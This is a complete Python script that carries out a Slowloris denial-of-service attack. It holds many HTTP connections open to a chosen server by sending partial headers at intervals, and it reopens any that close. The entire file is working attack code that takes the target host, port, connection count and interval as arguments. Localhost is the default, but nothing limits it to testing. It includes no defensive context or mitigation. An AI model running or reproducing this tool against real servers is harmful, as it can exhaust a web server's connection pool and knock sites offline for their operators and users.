import socket
import threading
import time
import sys

# Global variables for user-configurable attack parameters
TARGET = "127.0.0.1"  # Default: Localhost (for testing)
PORT = 8080  # Default port
NUM_CONNECTIONS = 100  # Number of simultaneous connections
INTERVAL = 10  # Time interval between header sends


def create_socket():
    """Creates and returns a socket connection to the target."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)  # Prevent indefinite hanging
        s.connect((TARGET, PORT))
        s.send(f"GET / HTTP/1.1\r\nHost: {TARGET}\r\n".encode("utf-8"))
        return s
    except socket.error as err:
        print(f"[ERROR] Connection failed: {err}")
        return None


def attack():
    """Performs the Slowloris attack by maintaining open HTTP connections."""
    socket_list = []

    print(f"[INFO] Launching attack on {TARGET}:{PORT} with {NUM_CONNECTIONS} connections...")
    
    # Create multiple connections
    for _ in range(NUM_CONNECTIONS):
        s = create_socket()
        if s:
            socket_list.append(s)
        time.sleep(0.1)  # Small delay to avoid connection burst

    print(f"[INFO] {len(socket_list)} connections established. Sending keep-alive headers...")

    while True:
        try:
            for s in socket_list:
                try:
                    s.send("X-a: keep-alive\r\n".encode("utf-8"))  # Partial HTTP header
                except socket.error:
                    socket_list.remove(s)
                    s = create_socket()
                    if s:
                        socket_list.append(s)
            time.sleep(INTERVAL)  # Delay between sending headers
        except KeyboardInterrupt:
            print("\n[INFO] Attack stopped by user.")
            break
        except Exception as e:
            print(f"[ERROR] Unexpected error: {e}")
            break


if __name__ == "__main__":
    # Display script usage information
    if len(sys.argv) == 5:
        try:
            TARGET = sys.argv[1]
            PORT = int(sys.argv[2])
            NUM_CONNECTIONS = int(sys.argv[3])
            INTERVAL = int(sys.argv[4])
        except ValueError:
            print("[ERROR] Invalid input. Usage: python slowloris.py <target> <port> <connections> <interval>")
            sys.exit(1)
    else:
        print("[INFO] Using default values. Run with arguments for customization.")
        print("Usage: python slowloris.py <target> <port> <connections> <interval>")

    attack()
